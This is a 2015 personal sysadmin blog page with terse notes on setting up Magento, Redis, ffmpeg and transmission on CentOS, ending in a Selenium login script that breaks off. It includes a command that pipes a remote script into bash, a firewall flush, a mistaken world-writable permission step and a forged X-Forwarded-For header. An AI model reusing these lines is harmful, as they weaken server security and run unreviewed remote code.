    <h1 class="title"><a href="/2015/09/09/What-stuff-has-done-with-Magento/">What stuff has done with Magento</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://devdocs.magento.com/guides/m1x/index.html">http://devdocs.magento.com/guides/m1x/index.html</a><br><a target="_blank" rel="noopener" href="http://devdocs.magento.com/guides/m1x/install/installing_install.html">http://devdocs.magento.com/guides/m1x/install/installing_install.html</a><br><a target="_blank" rel="noopener" href="http://merch.docs.magento.com/ce/user_guide/Magento_Community_Edition_User_Guide.html">http://merch.docs.magento.com/ce/user_guide/Magento_Community_Edition_User_Guide.html</a></p>
<ul>
<li><p>Upgrade system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">useradd user</span><br><span class="line"></span><br><span class="line">yum update</span><br><span class="line">yum clean</span><br><span class="line">yum install yum-utils</span><br><span class="line">yum-complete-transaction</span><br><span class="line"></span><br><span class="line">yum install php php-mysql</span><br><span class="line">yum install httpd</span><br><span class="line">yum install mysql-server</span><br><span class="line">service mysqld start</span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>
</li>
<li><p>Fix php5.1 upgrade to php5.4w</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http://mirror.webtatic.com/yum/el5/latest.rpm</span><br><span class="line">yum remove php php-mysql</span><br><span class="line">yum install yum-plugin-replace</span><br><span class="line">yum replace php-common --replace-with=php54w-common</span><br><span class="line">yum install php54w</span><br><span class="line"></span><br><span class="line">yum install php54w-mcrypt</span><br><span class="line">yum install php54w-gd</span><br><span class="line">yum install php54w-soap</span><br><span class="line">yum install php54w-mbstring</span><br><span class="line">yum install php54w-devel # for phpredis extension</span><br></pre></td></tr></table></figure>
</li>
<li><p>disable iptables</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">http://wiki.centos.org/HowTos/Network/IPTables</span><br><span class="line"></span><br><span class="line">cat /etc/sysconfig/iptables | see the rules</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 20 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -j RH-Firewall-1-INPUT</span><br><span class="line">iptables -A FORWARD -j RH-Firewall-1-INPUT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -i lo -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -p icmp --icmp-type any -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -p 50 -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -p 51 -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -p udp --dport 5353 -d 224.0.0.251 -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -p udp -m udp --dport 631 -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -p tcp -m tcp --dport 631 -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A RH-Firewall-1-INPUT -j REJECT --reject-with icmp-host-prohibited</span><br><span class="line"></span><br><span class="line">/*modprobe ip_conntrack_ftp</span><br><span class="line">iptables -I INPUT  -p tcp -m tcp --dport 21 -m conntrack --ctstate ESTABLISHED -j ACCEPT -m comment --comment &quot;Allow ftp connections on port 21&quot;</span><br><span class="line">iptables -I OUTPUT -p tcp -m tcp --dport 21 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT -m comment --comment &quot;Allow ftp connections on port 21&quot;</span><br><span class="line"></span><br><span class="line">iptables -I INPUT  -p tcp -m tcp --dport 20 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT -m comment --comment &quot;Allow ftp connections on port 20&quot;</span><br><span class="line">iptables -I OUTPUT -p tcp -m tcp --dport 20 -m conntrack --ctstate ESTABLISHED -j ACCEPT -m comment --comment &quot;Allow ftp connections on port 20&quot;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">iptables -I INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -I INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 20022:20023 -j ACCEPT</span><br><span class="line"></span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
</li>
<li><p>Settings</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chown -R 777 magento/media</span><br><span class="line">php_value memory_limit 512M in .htaccess</span><br><span class="line">upload_max_filesize = 100M /etc/php.ini</span><br></pre></td></tr></table></figure>
</li>
<li><p>Fix problem (PHP Fatal error:  Unknown: Failed opening required ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;magento&#x2F;index.php’ (include_path&#x3D;’.:&#x2F;usr&#x2F;share&#x2F;pear:&#x2F;usr&#x2F;share&#x2F;php’) in Unknown on line 0)<br><code>sudo /sbin/restorecon -R /var/www/html/magento/</code></p>
</li>
<li><p>Install git</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum -y install zlib-devel openssl-devel cpio expat-devel gettext-devel gcc</span><br><span class="line">wget https://www.kernel.org/pub/software/scm/git/git-1.8.5.4.tar.gz</span><br><span class="line">make configure</span><br><span class="line">./configure --with-expat --with-openssl --with-curl</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>Upgrade mysql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum remove mysql-*</span><br><span class="line">yum remove libmysqlclient15-5.0.95-5.w5.x86_64</span><br><span class="line"></span><br><span class="line">download mysql-community-release-el5-&#123;version-number&#125;.noarch.rpm from http://dev.mysql.com/doc/mysql-repo-excerpt/5.6/en/linux-installation-yum-repo.html</span><br><span class="line">rpm -Uvh mysql-community-release-el5-5.noarch.rpm</span><br><span class="line">yum install mysql-community-server</span><br><span class="line">yum install -y dovecot</span><br><span class="line">yum install -y perl-DBD-MySQL</span><br><span class="line">yum install -y php54w-mysql</span><br></pre></td></tr></table></figure>
</li>
<li><p>Remove index.php in url<br>in &#x2F;etc&#x2F;conf&#x2F;httpd.conf, in section <code>&lt;Directory &quot;/var/www/html&quot;&gt;</code>, change <code>AllowOverride None</code> to <code>AllowOverride All</code><br>edit magento&#x2F;.htaccess and uncomment the line: RewriteBase &#x2F;magento&#x2F;<br>in admin console,<br>In System-&gt;Configuration-&gt;Web-&gt;Search Engines Optimizations, select Yes<br>In System-&gt;Configuration-&gt;Web-&gt;Secure-&gt;Use Secure Urls in the fontend, select Yes</p>
</li>
<li><p>Admin console settings<br>System-&gt;Configuration-&gt;System-&gt;Advanced-&gt;Advanced-&gt;Disable Modules Output<br>System-&gt;Configuration-&gt;System-&gt;Advanced-&gt;Developer-&gt;Log Settings<br>set Mage::setIsDeveloperMode(true); and ini_set(‘display_errors’, 1); in file index.php<br>System-&gt;Cache Management<br>System-&gt;Index Management</p>
</li>
<li><p>Access control to catogeroy<br>System-&gt;Category-&gt;Customer Groups Access Control <a target="_blank" rel="noopener" href="http://www.zetaprints.com/magentohelp/magento-access-control-for-dynamic-imaging/">http://www.zetaprints.com/magentohelp/magento-access-control-for-dynamic-imaging/</a></p>
</li>
<li><p>Install extenstion<br>System-&gt;Magento Connect</p>
</li>
<li><p>Install phpMyAdmin<br>cd &#x2F;var&#x2F;www&#x2F;html &amp;&amp; mv phpMyAdmin pma</p>
</li>
<li><p>Product video link<br><a target="_blank" rel="noopener" href="http://de.magentocommerce.com/magento-connect/product-videos-2.html">http://de.magentocommerce.com/magento-connect/product-videos-2.html</a><br><a target="_blank" rel="noopener" href="http://www.magentocommerce.com/magento-connect/product-video-1.html">http://www.magentocommerce.com/magento-connect/product-video-1.html</a><br><a target="_blank" rel="noopener" href="http://www.magentocommerce.com/magento-connect/product-video-4.html">http://www.magentocommerce.com/magento-connect/product-video-4.html</a><br>Installed <a target="_blank" rel="noopener" href="http://www.magentocommerce.com/magento-connect/youtube-video-gallery-1.html">http://www.magentocommerce.com/magento-connect/youtube-video-gallery-1.html</a></p>
</li>
<li><p>Disable Mage_Notification module to off the noti of callout</p>
</li>
<li><p>Set logo<br>System-&gt;Configuration-&gt;General-&gt;design-&gt;Logo Image Src</p>
</li>
<li><p>Change color<br>Install ruby and rubygems and compass</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.rvm.io | bash</span><br><span class="line">srouce /etc/profile.d/rvm.sh</span><br><span class="line">rvm install 1.9.3</span><br><span class="line">rvm use 1.9.3 --default</span><br><span class="line">gem install compass</span><br><span class="line">Change color =&gt; compass watch . &amp;&amp; edit skin/frontend/rwd/default/scss/_var.scss</span><br></pre></td></tr></table></figure>
</li>
<li><p>Log all sql<br>Edit lib&#x2F;Varien&#x2F;Db&#x2F;Adapter&#x2F;Pdo&#x2F;Mysql.php, on these $_debug $_logAllQueries, refer to <a target="_blank" rel="noopener" href="http://magento.stackexchange.com/questions/25113/how-to-log-all-magento-sql">how-to-log-all-magento-sql</a></p>
</li>
<li><p>Install Redis</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/antirez/redis/archive/2.8.21.tar.gz</span><br><span class="line">tar zxf redis-2.8.21.tar.gz</span><br><span class="line">make &amp;&amp; sudo make install</span><br><span class="line">cd utils</span><br><span class="line">./install_server.sh # the last answer is &quot;/usr/local/bin/redis-server&quot;</span><br><span class="line">sudo chkconfig redis_6379 on</span><br><span class="line">sudo service redis_6379 start</span><br></pre></td></tr></table></figure>
</li>
<li><p>Install phpRedisAdmin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone git://github.com/ErikDubbelboer/phpRedisAdmin.git</span><br><span class="line">cd phpRedisAdmin</span><br><span class="line">git clone https://github.com/nrk/predis.git vendor</span><br></pre></td></tr></table></figure>
</li>
<li><p>Install Cm_RedisSession<br>enable Cm_RedisSession module<br><code>/app/etc/modules/Cm_RedisSession.xml</code> active -&gt; true<br><code>rm -rf var/cache</code><br>System &gt; Cache Management, Flush Magento Cache<br>update app&#x2F;etc&#x2F;local.xml</p>
</li>
<li><p>Install Cm_Cache_Backend_Redis &amp;&amp; phpredis &amp;&amp; modman</p>
<ul>
<li>phpredis<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/phpredis/phpredis</span><br><span class="line">phpize</span><br><span class="line">./configure [--enable-redis-igbinary]</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
add <code>extension=redis.so</code> in &#x2F;etc&#x2F;php.d&#x2F;redis.ini<br>add config of redis cache in app&#x2F;etc&#x2F;local.xml</li>
<li>Install modman from <a target="_blank" rel="noopener" href="https://github.com/colinmollenhour/modman">https://github.com/colinmollenhour/modman</a></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modman init</span><br><span class="line">modman clone https://github.com/colinmollenhour/Cm_Cache_Backend_Redis</span><br></pre></td></tr></table></figure>

<p>  lib Credis &amp;&amp; Cm_Cache_Backend_Redis are already installed, just copy these files to respective directory<br>  run php stats.php to show the usage of tags in redis</p>
<ul>
<li><p>Install tmux</p>
<ul>
<li><code>yum install glibc-static</code></li>
<li>install ncurse : <code>./configure &amp;&amp; make &amp;&amp; sudo make install</code></li>
<li>install tmux :<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-static CFLAGS=&quot;-I/usr/local/include -I/usr/local/include/ncurses&quot; LDFLAGS=&quot;-L/usr/local/lib -L/usr/local/include -L/usr/local/include/ncurses&quot; LIBEVENT_CFLAGS=&quot;-I/usr/local/include&quot; LIBEVENT_LIBS=&quot;-L/usr/local/lib -levent&quot;</span><br></pre></td></tr></table></figure></li>
<li>Reference: <a target="_blank" rel="noopener" href="http://pyther.net/2014/03/building-tmux-1-9a-statically/">http://pyther.net/2014/03/building-tmux-1-9a-statically/</a></li>
</ul>
</li>
<li><p>Install ranger</p>
<ul>
<li>yum install ncurses-devel</li>
<li>cd Python-2.7.3 &amp;&amp; .&#x2F;configure &amp;&amp; make &amp;&amp; sudo make</li>
<li>wget <a target="_blank" rel="noopener" href="http://nongnu.org/ranger/ranger-stable.tar.gz">http://nongnu.org/ranger/ranger-stable.tar.gz</a></li>
<li>cd ranger-1.7.1&#x2F; &amp;&amp; python setup.py install</li>
</ul>
</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-transmission-daemon-on-CentOS" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-08-31T03:49:05.000Z"><a href="/2015/08/31/Install-transmission-daemon-on-CentOS/">2015-08-31</a></time>
      
      
  
    <h1 class="title"><a href="/2015/08/31/Install-transmission-daemon-on-CentOS/">Install transmission-daemon on CentOS</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>Fail to install rTorrent on CentOS 5.4, just install transmission-daemon</p>
<ul>
<li><p>libevent</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://sourceforge.net/projects/levent/files/libevent/libevent-2.0/libevent-2.0.22-stable.tar.gz</span><br><span class="line">tar xzf libevent-2.0.22-stable.tar.gz</span><br><span class="line">cd libevent-2.0.22-stable</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>curl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://curl.haxx.se/download/curl-7.44.0.tar.gz</span><br><span class="line">tar zxf curl-7.44.0.tar.gz</span><br><span class="line">cd curl-7.44.0</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>transmission</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.transmissionbt.com/files/transmission-2.84.tar.xz</span><br><span class="line">yum install -y xz</span><br><span class="line">unxz transmission-2.84.tar.xz</span><br><span class="line">cd transmission-2.84</span><br><span class="line">export PKG_CONFIG_PATH=/usr/local/lib/pkgconfig</span><br><span class="line">export LIBS=&quot;-pthread -lm -lz -ldl -lutil&quot;</span><br><span class="line">export LIBCURL_LIBS=&quot;-I/usr/local/lib -lcurl&quot;</span><br><span class="line">export LIBEVENT_LIBS=&quot;-I/usr/local/lib -levent&quot;</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure></li>
</ul>
<p>check config at <code>$HOME/.config/transmission-daemon</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">transmission-remote --add xxx.torrent # add seed</span><br><span class="line">transmission-remote -st # check status</span><br><span class="line">transmission-remote -l # list</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-ffmpeg-on-CentOS-RHEL OR Fedora)" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-08-27T07:25:46.000Z"><a href="/2015/08/27/Install-ffmpeg-on-CentOS-RHEL%20OR%20Fedora)/">2015-08-27</a></time>
      
      
  
    <h1 class="title"><a href="/2015/08/27/Install-ffmpeg-on-CentOS-RHEL%20OR%20Fedora)/">Install ffmpeg on CentOS (RHEL/Fedora)</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ffmpeg_sources</span><br><span class="line">cd ffmpeg_sources/</span><br></pre></td></tr></table></figure>

<ul>
<li><p>yasm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.tortall.net/projects/yasm/releases/yasm-1.2.0.tar.gz</span><br><span class="line">tar zxvf yasm-1.2.0.tar.gz</span><br><span class="line"># ./configure</span><br><span class="line">./configure --prefix=/opt/software/ffmpeg_sources/ffmpeg_build</span><br><span class="line">#make &amp;&amp; sudo make install</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>x264</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo echo &quot;/opt/software/ffmpeg_sources/ffmpeg_build/lib&quot; &gt; /etc/ld.so.conf.d/ffmpeg.conf</span><br><span class="line">sudo ldconfig</span><br><span class="line">export PATH=$PATH:/opt/software/ffmpeg_sources/ffmpeg_build/bin</span><br><span class="line"></span><br><span class="line">#git clone git://git.videolan.org/x264.git (old)</span><br><span class="line">git clone https://git.videolan.org/git/x264.git</span><br><span class="line">cd x264</span><br><span class="line">./configure --prefix=/opt/software/ffmpeg_sources/ffmpeg_build --enable-static</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>lame</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -L -O http://downloads.sourceforge.net/project/lame/lame/3.99/lame-3.99.5.tar.gz</span><br><span class="line">tar zxf lame-3.99.5.tar.gz</span><br><span class="line">./configure --prefix=/opt/software/ffmpeg_sources/ffmpeg_build --enable-nasm</span><br><span class="line">make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>ogg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://downloads.xiph.org/releases/ogg/libogg-1.3.0.tar.gz</span><br><span class="line">tar zxvf libogg-1.3.0.tar.gz</span><br><span class="line">cd libogg-1.3.0</span><br><span class="line">./configure --prefix=/opt/software/ffmpeg_sources/ffmpeg_build</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>libvorbis</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://downloads.xiph.org/releases/vorbis/libvorbis-1.3.4.tar.gz</span><br><span class="line">tar zxvf libvorbis-1.3.4.tar.gz</span><br><span class="line">export PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/opt/software/ffmpeg_sources/ffmpeg_build/lib/pkgconfig</span><br><span class="line">./configure --prefix=/opt/software/ffmpeg_sources/ffmpeg_build --with-ogg</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>libvpx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/webmproject/libvpx.git #(need to set core.gitProxy)</span><br><span class="line">cd libvpx/</span><br><span class="line">./configure --prefix=/opt/software/ffmpeg_sources/ffmpeg_build </span><br><span class="line">make &amp;&amp; sudo make install</span><br><span class="line"></span><br><span class="line">#sudo echo /usr/local/lib &gt; /etc/ld.so.conf.d/local-libs.conf</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
</li>
<li><p>xvidcore</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://downloads.xvid.org/downloads/xvidcore-1.3.2.tar.gz</span><br><span class="line">tar zxf xvidcore-1.3.2.tar.gz</span><br><span class="line">cd xvidcore/build/generic</span><br><span class="line">./configure --prefix=/opt/software/ffmpeg_sources/ffmpeg_build</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>ffmpeg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#git clone git://git.videolan.org/ffmpeg.git (old)</span><br><span class="line">git clone https://git.videolan.org/git/ffmpeg.git</span><br><span class="line">cd ffmpeg</span><br><span class="line">./configure --prefix=/opt/software/ffmpeg_sources/ffmpeg_build --enable-libmp3lame --enable-gpl --enable-libx264 --enable-libxvid --enable-postproc --enable-nonfree --enable-libvpx --enable-libvorbis --extra-cflags=-I/opt/software/ffmpeg_sources/ffmpeg_build/include --extra-ldflags=-L/opt/software/ffmpeg_sources/ffmpeg_build/lib ## no faac --enable-libfaac</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">ffmpeg -headers &quot;X-Forwarded-For: 160.53.186.194&quot; -i http://stmw.rthk.hk/aod/_definst_/radio/archive/radio1/City_Snapshot/mp3/mp3:20150824.mp3/playlist.m3u8 -c copy City_Snapshot-20150824-.mp3</span><br></pre></td></tr></table></figure>
<p>the option “headers” must be put here for download this m3u8</p>
</li>
<li><p>Reference<br><a target="_blank" rel="noopener" href="https://trac.ffmpeg.org/wiki/CompilationGuide/Centos">https://trac.ffmpeg.org/wiki/CompilationGuide/Centos</a><br><a target="_blank" rel="noopener" href="http://injustfiveminutes.com/2013/07/17/how-to-compile-latest-version-of-ffmpeg-on-centos-5/">http://injustfiveminutes.com/2013/07/17/how-to-compile-latest-version-of-ffmpeg-on-centos-5/</a></p>
</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Auto-login-in-koding.com-using-selenium" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-07-30T04:42:59.000Z"><a href="/2015/07/30/Auto-login-in-koding.com-using-selenium/">2015-07-30</a></time>
      
      
  
    <h1 class="title"><a href="/2015/07/30/Auto-login-in-koding.com-using-selenium/">Auto login in koding.com using selenium</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">package xx;</span><br><span class="line"></span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">import org.openqa.selenium.By;</span><br><span class="line">import org.openqa.selenium.WebDriver;</span><br><span class="line">import org.openqa.selenium.WebElement;</span><br><span class="line">import org.openqa.selenium.remote.DesiredCapabilities;</span><br><span class="line">import org.openqa.selenium.remote.RemoteWebDriver;</span><br><span class="line">import org.openqa.selenium.support.ui.WebDriverWait;</span><br><span class="line"></span><br><span class="line">import com.google.common.base.Function;</span><br><span class="line"></span><br><span class="line">public class Selenium2Example &#123;</span><br><span class="line">	public static void main(String[] args) throws MalformedURLException &#123;</span><br><span class="line">		// Create a new instance of the Chrome driver</span><br><span class="line">		// Notice that the remainder of the code relies on the interface, </span><br><span class="line">		// not the implementation.</span><br><span class="line">		System.setProperty(&quot;webdriver.chrome.driver&quot;,</span><br><span class="line">				&quot;C:\\Users\\User\\#Downloads\\chromedriver_win32\\chromedriver.exe&quot;);</span><br><span class="line">		ChromeDriver driver = new ChromeDriver();</span><br><span class="line"></span><br><span class="line">		//WebDriver driver = new RemoteWebDriver(new URL(&quot;http://127.0.0.1:9515&quot;), DesiredCapabilities.chrome());</span><br><span class="line"></span><br><span class="line">		// And now use this to visit Google</span><br><span class="line">		driver.get(&quot;https://koding.com/Login&quot;);</span><br><span class="line">		// Alternatively the same thing can be done like this</span><br><span class="line">		// driver.navigate().to(&quot;http://www.google.com&quot;);</span><br><span class="line"></span><br><span class="line">		// Find the text input element by its name</span><br><span class="line">		WebElement element = driver.findElement(By.name(&quot;username&quot;));</span><br><span class="line"></span><br><span class="line">		// Enter something to search for</span><br><span class="line">		CharSequence[] ch = new CharSequence[] &#123; &quot;xxx&quot; &#125;;</span><br><span class="line">		element.sendKeys(ch);</span><br><span class="line"></span><br><span 